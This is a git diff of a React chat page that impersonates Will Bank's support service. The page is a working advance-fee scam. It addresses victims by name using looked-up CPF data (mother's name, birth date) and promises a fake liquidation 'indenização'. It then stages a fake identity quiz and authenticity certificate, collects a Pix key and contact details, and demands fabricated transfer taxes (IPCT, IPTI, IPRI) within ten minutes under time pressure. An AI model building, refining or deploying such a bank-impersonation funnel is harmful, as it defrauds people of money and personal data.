@@ -2,27 +2,28 @@ import { useEffect, useState, useRef } from "react";
 import { useNavigate, useLocation } from "react-router-dom";
 import { Button } from "@/components/ui/button";
 import { Input } from "@/components/ui/input";
-import { CheckCircle2, Play, Pause, Check, ArrowLeft, MoreVertical, Phone, Send, Mic, Paperclip, Smile, Volume2, Shield, Clock, Mail, Smartphone } from "lucide-react";
+import { CheckCircle2, Play, Pause, Check, ArrowLeft, MoreVertical, Phone, Send, Mic, Paperclip, Smile, Shield, Clock, Mail, Smartphone, X } from "lucide-react";
 import { CPFData } from "@/lib/cpf";
 import willbankLogo from "@/assets/willbank-logo.png";
 
 type ChatStep = 
   | "waiting-video"
   | "greeting" 
-  | "video" 
   | "quiz-mae" 
   | "quiz-nascimento" 
   | "identity-confirmed"
-  | "comprovante"
-  | "pix-selection"
+  | "audio-1-approval"
   | "pix-type-selection"
+  | "pix-cpf-input"
+  | "pix-email-input"
   | "pix-confirm"
+  | "audio-2-comprovante"
   | "generating-comprovante"
-  | "comprovante-final"
   | "envio-selection"
   | "sms-input"
   | "email-input"
-  | "taxa-explanation"
+  | "audio-3-taxas"
+  | "taxa-info"
   | "processing"
   | "final";
 
@@ -33,7 +34,7 @@ interface QuizOption {
 
 interface Message {
   id: number;
-  type: 'bot' | 'user' | 'system' | 'audio';
+  type: 'bot' | 'user' | 'system' | 'audio' | 'error';
   content: React.ReactNode;
   time: string;
   audioSrc?: string;
@@ -47,14 +48,16 @@ const Chat = () => {
   const [showVideo, setShowVideo] = useState(false);
   const [videoPlaying, setVideoPlaying] = useState(false);
   const [quizOptions, setQuizOptions] = useState<QuizOption[]>([]);
+  const [pixKeyInput, setPixKeyInput] = useState("");
   const [phoneNumber, setPhoneNumber] = useState("");
   const [emailInput, setEmailInput] = useState("");
+  const [showPixInput, setShowPixInput] = useState(false);
   const [showPhoneInput, setShowPhoneInput] = useState(false);
   const [showEmailInput, setShowEmailInput] = useState(false);
   const [isTyping, setIsTyping] = useState(false);
   const [currentAudio, setCurrentAudio] = useState<HTMLAudioElement | null>(null);
   const [playingAudioId, setPlayingAudioId] = useState<number | null>(null);
-  const [selectedPixType, setSelectedPixType] = useState<"cpf" | "email" | null>(null);
+  const [selectedPixType, setSelectedPixType] = useState<"telefone" | "cpf" | "email" | null>(null);
   const [audioListened, setAudioListened] = useState<Set<string>>(new Set());
   const [waitingForAudio, setWaitingForAudio] = useState<string | null>(null);
   const messagesEndRef = useRef<HTMLDivElement>(null);
@@ -116,10 +119,10 @@ const Chat = () => {
       time: getCurrentTime()
     };
     setMessages(prev => [...prev, newMessage]);
-    await delay(800); // Pause between messages
+    await delay(800);
   };
 
-  const addAudioMessage = async (audioSrc: string, duration: string, showTyping = true) => {
+  const addAudioMessage = async (audioSrc: string, showTyping = true) => {
     if (showTyping) {
       setIsTyping(true);
       await delay(2000);
@@ -144,6 +147,26 @@ const Chat = () => {
       time: getCurrentTime()
     };
     setMessages(prev => [...prev, newMessage]);
+  };
+
+  const addErrorMessage = async () => {
+    const newMessage: Message = {
+      id: Date.now() + Math.random(),
+      type: 'error',
+      content: (
+        <div className="flex flex-col items-center text-center space-y-4 p-4">
+          <div className="w-20 h-20 bg-red-500 rounded-full flex items-center justify-center">
+            <X className="w-12 h-12 text-white" strokeWidth={3} />
+          </div>
+          <p className="text-lg">
+            A opção selecionada <strong>não é compatível</strong> com o nome registrado na <strong>Receita Federal</strong>.
+          </p>
+        </div>
+      ),
+      time: getCurrentTime()
+    };
+    setMessages(prev => [...prev, newMessage]);
+    await delay(1500);
   };
 
   const generateFakeOptions = (correctAnswer: string, type: "mae" | "nascimento"): QuizOption[] => {
@@ -174,44 +197,36 @@ const Chat = () => {
     setVideoPlaying(false);
     setShowVideo(false);
     
-    // Start the conversation flow after video
     await delay(1500);
     
     await addBotMessage(
-      <span>Olá <strong>{cpfData?.nome}</strong>! 👋</span>,
-      true, 30
+      <span>Olá <strong>{cpfData?.nome}</strong>, Seja muito bem vindo ao <strong>Setor de Atendimento online</strong> do Will Bank.</span>,
+      true, 80
     );
 
     await delay(1200);
 
     await addBotMessage(
-      <span>Seja bem-vindo(a) ao <strong>Setor de Atendimento</strong> do Will Bank.</span>,
-      true, 60
+      <span>O número do <strong>PROTOCOLO</strong> deste atendimento é: <span className="font-mono bg-primary/20 px-2 py-0.5 rounded text-sm">{protocolo}</span></span>,
+      true, 50
     );
 
     await delay(1500);
 
     await addBotMessage(
-      <span>Protocolo de atendimento: <span className="font-mono bg-primary/20 px-2 py-0.5 rounded text-sm">{protocolo}</span></span>,
-      true, 40
-    );
-
-    await delay(2000);
-
-    await addBotMessage(
       <div className="space-y-2">
-        <span>Identificamos uma <strong>indenização referente à liquidação do Will Bank</strong> pendente em seu nome.</span>
+        <span>Você está a um passo de validar sua <strong>indenização referente à liquidação do Will Bank</strong>, no valor de:</span>
         <div className="mt-2 p-3 bg-green-50 border border-green-200 rounded-xl">
-          <span className="text-green-700 font-bold text-lg">R$ {valorBeneficio.toLocaleString('pt-BR', { minimumFractionDigits: 2 })}</span>
+          <span className="text-green-700 font-bold text-xl">R$ {valorBeneficio.toLocaleString('pt-BR', { minimumFractionDigits: 2 })}</span>
         </div>
       </div>,
-      true, 80
+      true, 100
     );
 
     await delay(2000);
 
     await addBotMessage(
-      <span>Para dar continuidade, precisamos <strong>validar sua identidade</strong>.</span>,
+      <span>Responda as perguntas a seguir para a <strong>aprovação da sua indenização</strong>.</span>,
       true, 55
     );
 
@@ -220,6 +235,13 @@ const Chat = () => {
     await addBotMessage(
       <span><strong>Qual o nome da sua mãe?</strong></span>,
       true, 25
+    );
+
+    await delay(500);
+
+    await addBotMessage(
+      <span className="text-muted-foreground text-sm">Escolha a alternativa correta.</span>,
+      false
     );
 
     setQuizOptions(generateFakeOptions(cpfData?.nomeMae || "", "mae"));
@@ -238,12 +260,11 @@ const Chat = () => {
     }
   };
 
-const handleQuizAnswer = async (option: QuizOption, quizType: "mae" | "nascimento") => {
-    // Store current step to prevent race conditions
+  const handleQuizAnswer = async (option: QuizOption, quizType: "mae" | "nascimento") => {
     const currentQuizType = quizType;
     
     addUserMessage(<span>{option.text}</span>);
-    setQuizOptions([]); // Clear options immediately after selection
+    setQuizOptions([]);
     
     await delay(500);
     
@@ -251,17 +272,23 @@ const handleQuizAnswer = async (option: QuizOption, quizType: "mae" | "nasciment
       await addBotMessage(
         <span className="flex items-center gap-2 text-green-600">
           <CheckCircle2 className="w-4 h-4" />
-          Resposta correta!
+          Resposta correta! ✅
         </span>,
         true, 20
       );
 
       if (currentQuizType === "mae") {
-        await delay(1500);
+        await delay(1000);
+        await addBotMessage(<span>Próxima pergunta...</span>, true, 20);
+        await delay(1000);
         await addBotMessage(<span><strong>Qual sua data de nascimento?</strong></span>, true, 30);
+        await delay(500);
+        await addBotMessage(
+          <span className="text-muted-foreground text-sm">Escolha a alternativa correta.</span>,
+          false
+        );
         const newOptions = generateFakeOptions(cpfData?.dataNascimento || "", "nascimento");
         setStep("quiz-nascimento");
-        // Small delay to ensure step is set before showing options
         await delay(100);
         setQuizOptions(newOptions);
       } else {
@@ -276,11 +303,13 @@ const handleQuizAnswer = async (option: QuizOption, quizType: "mae" | "nasciment
           true, 35
         );
         setStep("identity-confirmed");
-        await showComprovante();
+        await showAutenticidadeCertificado();
       }
     } else {
-      await addBotMessage(<span className="text-red-500">❌ Resposta incorreta. Tente novamente:</span>, true, 40);
-      // Keep same step but regenerate options after a small delay
+      // Show error image
+      await addErrorMessage();
+      
+      await addBotMessage(<span>Tente novamente:</span>, true, 20);
       await delay(300);
       const retryOptions = generateFakeOptions(
         currentQuizType === "mae" ? (cpfData?.nomeMae || "") : (cpfData?.dataNascimento || ""),
@@ -310,31 +339,30 @@ const handleQuizAnswer = async (option: QuizOption, quizType: "mae" | "nasciment
     audio.onended = () => {
       setPlayingAudioId(null);
       setCurrentAudio(null);
-      // Mark audio as listened
       setAudioListened(prev => new Set(prev).add(audioSrc));
-      // Clear waiting state if this was the audio we were waiting for
       if (waitingForAudio === audioSrc) {
         setWaitingForAudio(null);
       }
     };
   };
 
-  const showComprovante = async () => {
+  const showAutenticidadeCertificado = async () => {
     await delay(2000);
 
+    // Certificado de Autenticidade
     await addBotMessage(
       <div className="bg-card border-2 border-primary/30 rounded-2xl p-5 space-y-4 shadow-lg">
         <div className="flex justify-center">
           <img src={willbankLogo} alt="Will Bank" className="h-10" />
         </div>
-        <h3 className="text-lg font-bold text-center">Certificado de Autenticidade</h3>
+        <h3 className="text-lg font-bold text-center italic">Confirmação de Autenticidade</h3>
         
         <div className="bg-gradient-to-r from-primary to-amber-400 text-primary-foreground text-center py-2 rounded-full text-sm font-bold">
-          ✓ DADOS VERIFICADOS
+          Dados Autenticados
         </div>
         
         <p className="text-center text-sm text-muted-foreground">
-          Sr(a). <strong className="text-foreground">{cpfData?.nome}</strong>
+          Os dados do(a) Sr(a). <strong className="text-foreground">{cpfData?.nome}</strong> foram encontrados em nosso sistema e sua autenticidade foi confirmada.
         </p>
 
         <div className="divide-y border rounded-xl overflow-hidden bg-muted/30">
@@ -342,6 +370,9 @@ const handleQuizAnswer = async (option: QuizOption, quizType: "mae" | "nasciment
           <DataRow label="CPF" value={cpfData?.cpf || ""} />
           <DataRow label="Data de Nascimento" value={cpfData?.dataNascimento || ""} />
           <DataRow label="Nome da Mãe" value={cpfData?.nomeMae || ""} />
+          <DataRow label="Cidade/Estado" value="Brasil" />
+          <DataRow label="Data e Hora da Consulta" value={new Date().toLocaleString('pt-BR')} />
+          <DataRow label="Protocolo" value={protocolo} />
         </div>
       </div>,
       false
@@ -349,77 +380,81 @@ const handleQuizAnswer = async (option: QuizOption, quizType: "mae" | "nasciment
 
     await delay(2500);
 
+    // Approval Animation Card
     await addBotMessage(
-      <span>Sua indenização referente à liquidação do Will Bank está <strong>disponível para saque</strong>:</span>,
-      true, 65
-    );
-
-    await delay(1000);
-
-    await addBotMessage(
-      <div className="text-center p-4 bg-gradient-to-br from-green-50 to-emerald-50 border border-green-200 rounded-xl">
-        <span className="text-3xl font-black text-green-600">R$ {valorBeneficio.toLocaleString('pt-BR', { minimumFractionDigits: 2 })}</span>
-      </div>,
-      false
-    );
-
-    await delay(2000);
-
-    // Audio 3 (was audio-1, now fixed to play first)
-    await addAudioMessage("/audio/audio-3.mp3", "0:15");
-
-    await delay(1500);
-
-    // Set waiting for audio - button will only show after audio is listened
-    setWaitingForAudio("/audio/audio-3.mp3");
-    setStep("pix-selection");
-  };
-
-  const handleAprovarIndenizacao = async () => {
-    addUserMessage(<span>✓ APROVAR INDENIZAÇÃO</span>);
-    setStep("processing"); // Clear button immediately
-
-    await delay(1500);
-
-    await addBotMessage(
-      <ApprovalAnimation value={valorBeneficio} />,
+      <ApprovalAnimation value={valorBeneficio} name={cpfData?.nome || ""} />,
       false
     );
 
     await delay(3500);
 
+    // Audio 1 - Approval
+    await addAudioMessage("/audio/audio-1.mp3");
+
+    await delay(1000);
+
+    setWaitingForAudio("/audio/audio-1.mp3");
+    setStep("audio-1-approval");
+  };
+
+  const handleAprovarIndenizacao = async () => {
+    addUserMessage(<span>✓ SIM, APROVAR INDENIZAÇÃO</span>);
+    setStep("processing");
+
+    await delay(1500);
+
     await addBotMessage(
       <span className="flex items-center gap-2">
         <CheckCircle2 className="w-5 h-5 text-green-500" />
-        Indenização aprovada!
+        Sua indenização foi aprovada! ✅
       </span>,
-      true, 25
+      true, 30
     );
 
     await delay(1500);
 
-    await addBotMessage(<span>Selecione o tipo de <strong>Chave Pix</strong> para receber:</span>, true, 45);
+    await addBotMessage(
+      <span>Escolha abaixo o tipo de <strong>Chave Pix</strong> que você deseja receber a sua quantia.</span>,
+      true, 60
+    );
 
     setStep("pix-type-selection");
+  };
+
+  const handlePixTypeTelefone = async () => {
+    addUserMessage(<span>📱 Telefone</span>);
+    setSelectedPixType("telefone");
+    setStep("processing");
+
+    await delay(1500);
+
+    await addBotMessage(<span>Insira sua <strong>chave pix</strong> (telefone) no campo abaixo:</span>, true, 40);
+
+    setStep("pix-cpf-input");
+    setShowPixInput(true);
   };
 
   const handlePixTypeCPF = async () => {
     addUserMessage(<span>📋 CPF</span>);
     setSelectedPixType("cpf");
+    setPixKeyInput(cpfData?.cpf || "");
     setStep("processing");
 
-    await delay(2000);
+    await delay(1500);
 
     await addBotMessage(
       <div className="bg-amber-50 border border-amber-300 rounded-xl p-4 space-y-3">
-        <p className="font-bold flex items-center gap-2">
-          <Shield className="w-5 h-5 text-amber-600" />
-          Confirme sua Chave PIX
+        <p className="font-bold text-red-600 flex items-center gap-2">
+          ⚠️ ATENÇÃO, {cpfData?.nome?.split(' ')[0]}!
         </p>
-        <p className="font-mono bg-white px-4 py-3 rounded-lg border text-lg font-bold text-center">{cpfData?.cpf}</p>
-        <p className="text-xs text-muted-foreground">Certifique-se que a chave está correta.</p>
+        <p className="text-sm">Confira os dados inseridos para garantir que o valor será transferido corretamente:</p>
+        <div className="bg-white rounded-lg p-3 border space-y-1">
+          <p><strong>Nome:</strong> {cpfData?.nome}</p>
+          <p><strong>Chave Pix:</strong> {cpfData?.cpf}</p>
+        </div>
+        <p className="text-xs text-muted-foreground">Se houver algum erro, o pagamento não será concluído. A WillBank não se responsabiliza em casos de transferências em chave pix erradas.</p>
       </div>,
-      true, 60
+      true, 80
     );
 
     setStep("pix-confirm");
@@ -432,31 +467,34 @@ const handleQuizAnswer = async (option: QuizOption, quizType: "mae" | "nasciment
 
     await delay(1500);
 
-    await addBotMessage(<span>Digite seu <strong>e-mail</strong> para cadastrar como chave PIX:</span>, true, 45);
+    await addBotMessage(<span>Insira sua <strong>chave pix</strong> (e-mail) no campo abaixo:</span>, true, 40);
 
-    setStep("email-input");
-    setShowEmailInput(true);
+    setStep("pix-email-input");
+    setShowPixInput(true);
   };
 
-  const handleEmailPixSubmit = async () => {
-    if (!emailInput.trim()) return;
+  const handlePixKeySubmit = async () => {
+    if (!pixKeyInput.trim()) return;
 
-    addUserMessage(<span>{emailInput}</span>);
-    setShowEmailInput(false);
+    addUserMessage(<span>{pixKeyInput}</span>);
+    setShowPixInput(false);
     setStep("processing");
 
-    await delay(2000);
+    await delay(1500);
 
     await addBotMessage(
       <div className="bg-amber-50 border border-amber-300 rounded-xl p-4 space-y-3">
-        <p className="font-bold flex items-center gap-2">
-          <Shield className="w-5 h-5 text-amber-600" />
-          Confirme sua Chave PIX
+        <p className="font-bold text-red-600 flex items-center gap-2">
+          ⚠️ ATENÇÃO, {cpfData?.nome?.split(' ')[0]}!
         </p>
-        <p className="font-mono bg-white px-4 py-3 rounded-lg border text-lg font-bold text-center">{emailInput}</p>
-        <p className="text-xs text-muted-foreground">Certifique-se que a chave está correta.</p>
+        <p className="text-sm">Confira os dados inseridos para garantir que o valor será transferido corretamente:</p>
+        <div className="bg-white rounded-lg p-3 border space-y-1">
+          <p><strong>Nome:</strong> {cpfData?.nome}</p>
+          <p><strong>Chave Pix:</strong> {pixKeyInput}</p>
+        </div>
+        <p className="text-xs text-muted-foreground">Se houver algum erro, o pagamento não será concluído. A WillBank não se responsabiliza em casos de transferências em chave pix erradas.</p>
       </div>,
-      true, 60
+      true, 80
     );
 
     setStep("pix-confirm");
@@ -466,57 +504,84 @@ const handleQuizAnswer = async (option: QuizOption, quizType: "mae" | "nasciment
     addUserMessage(<span>Sim, está correto ✓</span>);
     setStep("processing");
 
-    await delay(1500);
+    await delay(1000);
 
-    await addBotMessage(<span>Processando...</span>, true, 15);
+    await addBotMessage(<span>Aguarde um momento!</span>, true, 20);
+    
+    await delay(1500);
+    
+    await addBotMessage(<span className="text-primary">Finalizando o cadastro da sua chave pix...</span>, true, 40);
     
     await delay(2000);
     
     await addBotMessage(
       <span className="flex items-center gap-2 text-green-600">
         <CheckCircle2 className="w-4 h-4" />
-        Chave PIX cadastrada!
+        Sua chave pix foi cadastrada com sucesso!
       </span>,
-      true, 25
+      true, 35
     );
     
     await delay(2000);
 
-    // Audio 2 (middle audio)
-    await addAudioMessage("/audio/audio-2.mp3", "0:18");
+    // Audio 2 - Comprovante
+    await addAudioMessage("/audio/audio-2.mp3");
 
-    await delay(1500);
+    await delay(1000);
 
-    await addBotMessage(<span>Clique abaixo para <strong>gerar seu comprovante</strong>.</span>, true, 40);
+    await addBotMessage(
+      <span>Clique no botão abaixo para <strong>confirmar seu processo indenizatório</strong> e gerar seu comprovante de recebimento.</span>,
+      true, 70
+    );
 
-    // Set waiting for audio - button will only show after audio is listened
     setWaitingForAudio("/audio/audio-2.mp3");
-    setStep("comprovante-final");
+    setStep("audio-2-comprovante");
   };
 
   const handleGenerateComprovante = async () => {
-    addUserMessage(<span>GERAR COMPROVANTE</span>);
+    addUserMessage(<span>CONFIRMAR</span>);
     setStep("processing");
 
-    await delay(2000);
+    await delay(1500);
 
-    await addBotMessage(<span className="text-primary flex items-center gap-2"><Clock className="w-4 h-4 animate-spin" /> Gerando comprovante...</span>, true, 25);
+    await addBotMessage(<span className="text-primary flex items-center gap-2"><Clock className="w-4 h-4 animate-spin" /> Gerando seu comprovante de recebimento dos valores...</span>, true, 50);
     
     await delay(2500);
 
     await addBotMessage(
+      <span className="flex items-center gap-2 text-green-600">
+        <CheckCircle2 className="w-4 h-4" />
+        Seu Comprovante Indenizatório foi gerado com sucesso!
+      </span>,
+      true, 45
+    );
+
+    await delay(1500);
+
+    const pixKey = selectedPixType === "cpf" ? cpfData?.cpf : pixKeyInput;
+    const vencimento = new Date();
+    vencimento.setMinutes(vencimento.getMinutes() + 10);
+
+    const ipct = valorBeneficio * 0.0021;
+    const ipti = valorBeneficio * 0.0025;
+    const ipri = valorBeneficio * 0.0025;
+    const totalImposto = ipct + ipti + ipri;
+
+    // Comprovante Indenizatório
+    await addBotMessage(
       <div className="bg-card border-2 border-primary/30 rounded-2xl p-5 space-y-4 shadow-lg">
-        <h3 className="text-lg font-bold text-center border-b pb-3">📄 Comprovante Indenizatório</h3>
+        <h3 className="text-lg font-bold text-center italic border-b pb-3">Comprovante Indenizatório</h3>
         
         <div className="bg-amber-50 border-l-4 border-primary p-3 text-sm">
-          <p>Confirmamos o direito à indenização referente à liquidação do Will Bank do(a) Sr(a). <strong>{cpfData?.nome}</strong>.</p>
+          <p>O Will Bank, com base no processo indenizatório do Sr. (a) <strong>{cpfData?.nome}</strong>, portador do CPF <strong className="text-primary">{cpfData?.cpf}</strong>, <span className="text-primary font-semibold">confirma o direito à indenização por possuir cadastro no Will Bank</span>.</p>
         </div>
 
         <div className="divide-y border rounded-xl overflow-hidden">
-          <DataRow label="Valor" value={`R$ ${valorBeneficio.toLocaleString('pt-BR', { minimumFractionDigits: 2 })}`} highlight />
+          <DataRow label="Indenização a receber" value={`R$ ${valorBeneficio.toLocaleString('pt-BR', { minimumFractionDigits: 2 })}`} highlight />
           <DataRow label="Protocolo" value={protocolo} />
-          <DataRow label="CPF" value={cpfData?.cpf || ""} />
-          <DataRow label="Data/Hora" value={new Date().toLocaleString('pt-BR')} />
+          <DataRow label="Data e Hora de Emissão" value={new Date().toLocaleString('pt-BR')} />
+          <DataRow label="Vencimento" value={vencimento.toLocaleString('pt-BR')} />
+          <DataRow label="Imposto de Recebimento" value={`R$ ${totalImposto.toFixed(2).replace('.', ',')}`} />
         </div>
       </div>,
       false
@@ -524,13 +589,23 @@ const handleQuizAnswer = async (option: QuizOption, quizType: "mae" | "nasciment
 
     await delay(2500);
 
-    await addBotMessage(<span>Como deseja receber o comprovante?</span>, true, 35);
+    await addBotMessage(
+      <span>O setor de Indenização da WillBank confirma que seu processo indenizatório foi registrado com sucesso e vinculado ao seu CPF <strong>{cpfData?.cpf}</strong>.</span>,
+      true, 100
+    );
+
+    await delay(1500);
+
+    await addBotMessage(
+      <span><strong>IMPORTANTE:</strong> Escolha como deseja receber uma cópia do seu Comprovante Indenizatório.</span>,
+      true, 60
+    );
 
     setStep("envio-selection");
   };
 
   const handleSMSOption = async () => {
-    addUserMessage(<span>📱 SMS</span>);
+    addUserMessage(<span>📱 Receber por SMS</span>);
     setStep("processing");
     
     await delay(1500);
@@ -542,7 +617,7 @@ const handleQuizAnswer = async (option: QuizOption, quizType: "mae" | "nasciment
   };
 
   const handleEmailOption = async () => {
-    addUserMessage(<span>📧 E-mail</span>);
+    addUserMessage(<span>📧 Receber por E-mail</span>);
     setStep("processing");
     
     await delay(1500);
@@ -566,14 +641,15 @@ const handleQuizAnswer = async (option: QuizOption, quizType: "mae" | "nasciment
       <div className="space-y-2">
         <span className="flex items-center gap-2 text-green-600">
           <CheckCircle2 className="w-4 h-4" />
-          Comprovante enviado para {phoneNumber}!
+          Seu comprovante foi salvo!
         </span>
-        <p className="text-xs text-slate-400">⏰ Você receberá em até 24 horas.</p>
+        <p className="text-sm">Você irá receber uma cópia em <strong>{phoneNumber}</strong>.</p>
+        <p className="text-xs text-amber-600">⏰ Você receberá em até 24 horas.</p>
       </div>,
-      true, 30
+      true, 40
     );
 
-    await showTaxaExplanation();
+    await showTaxaInfo();
   };
 
   const handleEnvioEmailSubmit = async () => {
@@ -589,46 +665,51 @@ const handleQuizAnswer = async (option: QuizOption, quizType: "mae" | "nasciment
       <div className="space-y-2">
         <span className="flex items-center gap-2 text-green-600">
           <CheckCircle2 className="w-4 h-4" />
-          Comprovante enviado para {emailInput}!
+          Seu comprovante foi salvo!
         </span>
-        <p className="text-xs text-slate-400">⏰ Você receberá em até 24 horas.</p>
+        <p className="text-sm">Você irá receber uma cópia em <strong>{emailInput}</strong>.</p>
+        <p className="text-xs text-amber-600">⏰ Você receberá em até 24 horas.</p>
       </div>,
-      true, 30
+      true, 40
     );
 
-    await showTaxaExplanation();
+    await showTaxaInfo();
   };
 
-  const showTaxaExplanation = async () => {
+  const showTaxaInfo = async () => {
     await delay(2500);
 
     await addBotMessage(
       <div className="bg-red-50 border border-red-200 rounded-xl p-4 space-y-3">
-        <p className="font-bold text-red-700 flex items-center gap-2">
-          <Clock className="w-5 h-5" />
-          ATENÇÃO - PRAZO LIMITADO
-        </p>
-        <p className="text-sm">Sua indenização de <strong className="text-green-600">R$ {valorBeneficio.toLocaleString('pt-BR', { minimumFractionDigits: 2 })}</strong> está sendo processada.</p>
-        <p className="text-sm">Para liberar o valor, realize o pagamento do <strong>Imposto de Transferência</strong> em até <strong>10 minutos</strong>.</p>
+        <p className="font-bold text-red-700">⚠️ ATENÇÃO:</p>
+        <p className="text-sm">A WillBank já iniciou o repasse da sua indenização de <strong className="text-green-600">R$ {valorBeneficio.toLocaleString('pt-BR', { minimumFractionDigits: 2 })}</strong></p>
+        <p className="text-sm">Para liberar o seu valor é necessário realizar o pagamento do <strong>Imposto de Transferência</strong> em até <strong className="text-red-600">10 minutos</strong>.</p>
       </div>,
       true, 100
     );
 
     await delay(2000);
 
-    setStep("taxa-explanation");
+    await addBotMessage(
+      <span>Clique abaixo para entender o motivo do pagamento desse imposto.</span>,
+      true, 55
+    );
+
+    setStep("taxa-info");
   };
 
   const handleTaxExplanation = async () => {
-    addUserMessage(<span>❓ Por que tenho que pagar?</span>);
+    addUserMessage(<span>❓ PORQUE TENHO QUE PAGAR ESSE IMPOSTO?</span>);
     setStep("processing");
 
-    await delay(2000);
-
-    // Audio 1 - Explanation (was audio-3, now fixed to play last)
-    await addAudioMessage("/audio/audio-1.mp3", "0:25");
-
     await delay(1500);
+
+    await addBotMessage(
+      <span><strong>IMPORTANTE:</strong> Escute o áudio abaixo com bastante atenção!</span>,
+      true, 50
+    );
+
+    await delay(1000);
     
     const ipct = valorBeneficio * 0.0021;
     const ipti = valorBeneficio * 0.0025;
@@ -637,25 +718,32 @@ const handleQuizAnswer = async (option: QuizOption, quizType: "mae" | "nasciment
 
     await addBotMessage(
       <div className="bg-muted rounded-xl p-4 space-y-2 text-sm">
-        <p className="font-bold">📊 Cálculo dos impostos:</p>
+        <p className="font-bold">📊 Impostos gerados:</p>
         <div className="space-y-1">
-          <p>• IPCT (0,21%): <strong>R$ {ipct.toFixed(2).replace('.', ',')}</strong></p>
-          <p>• IPTI (0,25%): <strong>R$ {ipti.toFixed(2).replace('.', ',')}</strong></p>
-          <p>• IPRI (0,25%): <strong>R$ {ipri.toFixed(2).replace('.', ',')}</strong></p>
+          <p>• IPCT (Imposto sobre Circulação de Transferência 0,21%): <strong>R$ {ipct.toFixed(2).replace('.', ',')}</strong></p>
+          <p>• IPTI (Imposto sobre Transferência Indenizatório 0,25%): <strong>R$ {ipti.toFixed(2).replace('.', ',')}</strong></p>
+          <p>• IPRI (Imposto sobre Recebimento Indenizatório 0,25%): <strong>R$ {ipri.toFixed(2).replace('.', ',')}</strong></p>
         </div>
         <div className="pt-3 border-t mt-3">
-          <p className="font-bold text-primary text-base">Total: R$ {totalImposto.toFixed(2).replace('.', ',')}</p>
+          <p className="font-bold text-primary text-base">Valor total do Imposto: R$ {totalImposto.toFixed(2).replace('.', ',')} (0,71% do valor total a receber)</p>
         </div>
       </div>,
       true, 80
     );
 
-    await delay(2000);
+    await delay(1500);
 
-    await addBotMessage(<span>Após o pagamento, a transferência será liberada <strong>imediatamente</strong>.</span>, true, 55);
+    // Audio 3 - Taxas
+    await addAudioMessage("/audio/audio-3.mp3");
 
-    // Set waiting for audio - button will only show after audio is listened
-    setWaitingForAudio("/audio/audio-1.mp3");
+    await delay(1500);
+
+    await addBotMessage(
+      <span>Somente após você finalizar o pagamento do Imposto de Recebimento a WillBank terá a autorização de realizar transferências de valor alto diante o monitoramento fiscal.</span>,
+      true, 120
+    );
+
+    setWaitingForAudio("/audio/audio-3.mp3");
     setStep("final");
   };
 
@@ -715,13 +803,13 @@ const handleQuizAnswer = async (option: QuizOption, quizType: "mae" | "nasciment
             </span>
           </div>
 
-          {/* Video Section - Show at the beginning */}
+          {/* Video Section */}
           {showVideo && (
             <div className="mx-auto max-w-sm animate-fade-in">
-              <div 
-                className="relative aspect-[9/16] bg-black rounded-2xl overflow-hidden shadow-2xl"
-              >
-                {/* Real Video */}
+              <div className="text-center mb-3">
+                <p className="text-white text-sm">Clique no vídeo abaixo para darmos continuidade 👇</p>
+              </div>
+              <div className="relative aspect-[9/16] bg-black rounded-2xl overflow-hidden shadow-2xl">
                 <video
                   ref={videoRef}
                   src="/video/vsl_1.mp4"
@@ -731,7 +819,6 @@ const handleQuizAnswer = async (option: QuizOption, quizType: "mae" | "nasciment
                   onClick={handleVideoClick}
                 />
                 
-                {/* Play button overlay - show when not playing */}
                 {!videoPlaying && (
                   <div 
                     className="absolute inset-0 flex items-center justify-center bg-black/40 cursor-pointer"
@@ -758,25 +845,31 @@ const handleQuizAnswer = async (option: QuizOption, quizType: "mae" | "nasciment
                 </div>
               )}
               
-              <div className={`max-w-[85%] ${
-                message.type === 'user' 
-                  ? 'bg-primary text-primary-foreground rounded-2xl rounded-br-sm' 
-                  : 'bg-slate-700 text-white rounded-2xl rounded-bl-sm shadow-lg'
-              } px-4 py-3`}>
-                {message.type === 'audio' ? (
-                  <AudioPlayerComponent 
-                    audioSrc={message.audioSrc || ""}
-                    isPlaying={playingAudioId === message.id}
-                    onPlay={() => playAudio(message.audioSrc || "", message.id)}
-                    listened={audioListened.has(message.audioSrc || "")}
-                  />
-                ) : (
-                  <div className="text-sm leading-relaxed">{message.content}</div>
-                )}
-                <div className={`text-[10px] mt-1 text-right ${message.type === 'user' ? 'text-primary-foreground/70' : 'text-slate-400'}`}>
-                  {message.time}
+              {message.type === 'error' ? (
+                <div className="max-w-[85%] bg-white text-slate-800 rounded-2xl shadow-lg px-4 py-3">
+                  {message.content}
                 </div>
-              </div>
+              ) : (
+                <div className={`max-w-[85%] ${
+                  message.type === 'user' 
+                    ? 'bg-primary text-primary-foreground rounded-2xl rounded-br-sm' 
+                    : 'bg-slate-700 text-white rounded-2xl rounded-bl-sm shadow-lg'
+                } px-4 py-3`}>
+                  {message.type === 'audio' ? (
+                    <AudioPlayerComponent 
+                      audioSrc={message.audioSrc || ""}
+                      isPlaying={playingAudioId === message.id}
+                      onPlay={() => playAudio(message.audioSrc || "", message.id)}
+                      listened={audioListened.has(message.audioSrc || "")}
+                    />
+                  ) : (
+                    <div className="text-sm leading-relaxed">{message.content}</div>
+                  )}
+                  <div className={`text-[10px] mt-1 text-right ${message.type === 'user' ? 'text-primary-foreground/70' : 'text-slate-400'}`}>
+                    {message.time}
+                  </div>
+                </div>
+              )}
             </div>
           ))}
 
@@ -796,42 +889,45 @@ const handleQuizAnswer = async (option: QuizOption, quizType: "mae" | "nasciment
             </div>
           )}
 
-{/* Action Buttons */}
-              {!showVideo && (
-                <div className="flex flex-wrap gap-2 justify-center py-3">
-                  {/* Quiz Options - Only show for current quiz step with options */}
-                  {step === "quiz-mae" && quizOptions.length > 0 && quizOptions.map((option, index) => (
-                    <Button
-                      key={`mae-${index}-${option.text}`}
-                      onClick={() => handleQuizAnswer(option, "mae")}
-                      className="bg-slate-700 hover:bg-slate-600 text-white border border-slate-600 rounded-full font-medium shadow-lg text-sm"
-                    >
-                      {option.text}
-                    </Button>
-                  ))}
-                  
-                  {step === "quiz-nascimento" && quizOptions.length > 0 && quizOptions.map((option, index) => (
-                    <Button
-                      key={`nasc-${index}-${option.text}`}
-                      onClick={() => handleQuizAnswer(option, "nascimento")}
-                      className="bg-slate-700 hover:bg-slate-600 text-white border border-slate-600 rounded-full font-medium shadow-lg text-sm"
-                    >
-                      {option.text}
-                    </Button>
-                  ))}
+          {/* Action Buttons */}
+          {!showVideo && (
+            <div className="flex flex-wrap gap-2 justify-center py-3">
+              {/* Quiz Options */}
+              {step === "quiz-mae" && quizOptions.length > 0 && quizOptions.map((option, index) => (
+                <Button
+                  key={`mae-${index}-${option.text}`}
+                  onClick={() => handleQuizAnswer(option, "mae")}
